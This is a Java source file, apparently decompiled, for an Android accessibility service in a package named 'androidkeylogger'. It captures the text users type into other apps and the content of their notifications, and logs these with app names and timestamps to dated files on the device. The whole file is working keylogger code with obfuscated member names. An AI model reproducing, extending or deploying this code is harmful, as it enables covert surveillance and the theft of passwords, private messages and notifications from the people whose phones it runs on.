package com.azamovhudstc.androidkeylogger;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.text.format.DateFormat;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.List;
import java.util.Locale;

public class SvcAcc extends AccessibilityService {
    public static SvcAcc h = null;
    public static boolean i = false;
    public static boolean j = false;
    public String b;
    private String c;
    private String d;
    private String e;
    private String f;
    private String g;

    public SvcAcc() {
        String str = "";
        this.b = str;
        this.c = str;
        this.d = str;
        this.e = str;
        this.f = str;
    }

    private void b() {
        File file = new File(this.g, this.b);
        try {
            if (!file.exists()) {
                if (!file.createNewFile()) {
                    throw new Exception();
                }
            }
        } catch (Exception unused) {
        }
    }

    private String d() {
        try {
            return new SimpleDateFormat("yyyyMMdd", Locale.getDefault()).format(Calendar.getInstance().getTime());
        } catch (Exception unused) {
            return "";
        }
    }

    private void e() {
        String str = "\n";
        try {
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(new FileOutputStream(new File(this.g, this.b), true));
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.append(this.e);
            stringBuilder.append(" ");
            stringBuilder.append(this.f);
            String stringBuilder2 = stringBuilder.toString();
            StringBuilder stringBuilder3 = new StringBuilder();
            stringBuilder3.append("%");
            stringBuilder3.append(stringBuilder2.length());
            stringBuilder3.append("s");
            String replace = String.format(stringBuilder3.toString(), new Object[]{""}).replace(' ', '-');
            outputStreamWriter.write(replace);
            outputStreamWriter.write(str);
            outputStreamWriter.write(stringBuilder2);
            outputStreamWriter.write(str);
            outputStreamWriter.write(replace);
            outputStreamWriter.write(str);
            outputStreamWriter.write(this.d);
            outputStreamWriter.write("\n\n");
            outputStreamWriter.flush();
            outputStreamWriter.close();
        } catch (Exception e) {
            Log.e("apk.typingrecorder", e.getMessage());
        }
    }

    public void a() {
        String str = "";
        this.b = str;
        this.e = str;
        this.d = str;
    }

    public String c() {
        String str = "";
        if (this.d.isEmpty()) {
            return str;
        }
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append(this.e);
        stringBuilder.append(" ");
        stringBuilder.append(this.f);
        String stringBuilder2 = stringBuilder.toString();
        StringBuilder stringBuilder3 = new StringBuilder();
        stringBuilder3.append("%");
        stringBuilder3.append(stringBuilder2.length());
        stringBuilder3.append("s");
        str = String.format(stringBuilder3.toString(), new Object[]{str}).replace(' ', '-');
        stringBuilder3 = new StringBuilder();
        stringBuilder3.append(str);
        String str2 = "\n";
        stringBuilder3.append(str2);
        stringBuilder3.append(stringBuilder2);
        stringBuilder3.append(str2);
        stringBuilder3.append(str);
        stringBuilder3.append(str2);
        stringBuilder3.append(this.d);
        stringBuilder3.append("\n\n");
        return stringBuilder3.toString();
    }

    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        if (accessibilityEvent != null) {
            try {
                String str = "";
                if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                    if (!(d().equals(this.b) || this.b.isEmpty())) {
                        e();
                        this.c = this.d;
                        this.b = str;
                        this.e = str;
                        this.d = str;
                    }
                } else if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                    CharSequence packageName = accessibilityEvent.getPackageName();
                    String charSequence = packageName != null ? packageName.toString() : str;
                    if (!charSequence.equals(getPackageName())) {
                        String stringBuilder;
                        List text = accessibilityEvent.getText();
                        if (text != null) {
                            StringBuilder stringBuilder2 = new StringBuilder();
                            for (int i = 0; i < text.size(); i++) {
                                if (i > 0) {
                                    stringBuilder2.append("\n");
                                }
                                CharSequence charSequence2 = (CharSequence) text.get(i);
                                if (!(charSequence2 == null || charSequence2.toString().contains("￼"))) {
                                    stringBuilder2.append(charSequence2);
                                }
                            }
                            stringBuilder = stringBuilder2.toString();
                        } else {
                            stringBuilder = str;
                        }
                        CharSequence beforeText = accessibilityEvent.getBeforeText();
                        Object charSequence3 = beforeText != null ? beforeText.toString() : str;
                        if (!(this.f.equals(charSequence) || this.d.isEmpty())) {
                            e();
                            this.c = this.d;
                            this.b = str;
                            this.e = str;
                            this.d = str;
                        }
                        if (!(this.d.isEmpty() || this.d.equals(charSequence3) || this.d.equals(this.c))) {
                            e();
                            this.c = this.d;
                            this.b = str;
                            this.e = str;
                        }
                        this.d = stringBuilder;
                        this.f = charSequence;
                        if (!stringBuilder.isEmpty() && this.e.isEmpty()) {
                            this.e = new SimpleDateFormat(DateFormat.getBestDateTimePattern(Locale.getDefault(), DateFormat.is24HourFormat(getApplicationContext()) ? "Hms" : "hmsa"), Locale.getDefault()).format(Calendar.getInstance().getTime());
                        }
                        if (!this.d.isEmpty() && this.b.isEmpty()) {
                            this.b = d();
                            b();
                        }
                    }
                }else if(accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED){
                    CharSequence packageName = accessibilityEvent.getPackageName();
                    String charSequence = packageName != null ? packageName.toString() : str;
                    if (!charSequence.equals(getPackageName())) {
                        String stringBuilder;
                        List text = accessibilityEvent.getText();
                        if (text != null) {
                            StringBuilder stringBuilder2 = new StringBuilder();
                            for (int i = 0; i < text.size(); i++) {
                                if (i > 0) {
                                    stringBuilder2.append("\n");
                                }
                                CharSequence charSequence2 = (CharSequence) text.get(i);
                                if (!(charSequence2 == null || charSequence2.toString().contains("￼"))) {
                                    stringBuilder2.append(charSequence2);
                                }
                            }
                            stringBuilder = stringBuilder2.toString();
                        } else {
                            stringBuilder = str;
                        }
                        CharSequence beforeText = accessibilityEvent.getBeforeText();
                        Object charSequence3 = beforeText != null ? beforeText.toString() : str;
                        if (!(this.f.equals(charSequence) || this.d.isEmpty())) {
                            e();
                            this.c = this.d;
                            this.b = str;
                            this.e = str;
                            this.d = str;
                        }
                        if (!(this.d.isEmpty() || this.d.equals(charSequence3) || this.d.equals(this.c))) {
                            e();
                            this.c = this.d;
                            this.b = str;
                            this.e = str;
                        }
                        this.d = stringBuilder;
                        this.f = charSequence;
                        if (!stringBuilder.isEmpty() && this.e.isEmpty()) {
                            this.e = new SimpleDateFormat(DateFormat.getBestDateTimePattern(Locale.getDefault(), DateFormat.is24HourFormat(getApplicationContext()) ? "Hms" : "hmsa"), Locale.getDefault()).format(Calendar.getInstance().getTime());
                        }
                        if (!this.d.isEmpty() && this.b.isEmpty()) {
                            this.b = d();
                            b();
                        }
                    }
                }
            } catch (Exception e) {
                Log.e("apk.typingrecorder", e.getMessage());
            }
        }
    }

    public void onCreate() {
        super.onCreate();
        this.g = getFilesDir().getAbsolutePath();
    }

    public void onDestroy() {
        super.onDestroy();
        i = false;
        h = null;
    }

    public void onInterrupt() {
    }

    public void onRebind(Intent intent) {
        super.onRebind(intent);
        i = true;
        h = this;
    }

    /* Access modifiers changed, original: protected */
    public void onServiceConnected() {
        super.onServiceConnected();
        i = true;
        h = this;
        if (j) {
            j = false;
            Intent intent = new Intent(this, AccessibilityActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(intent);
        }
    }

    public boolean onUnbind(Intent intent) {
        i = false;
        h = null;
        return super.onUnbind(intent);
    }
}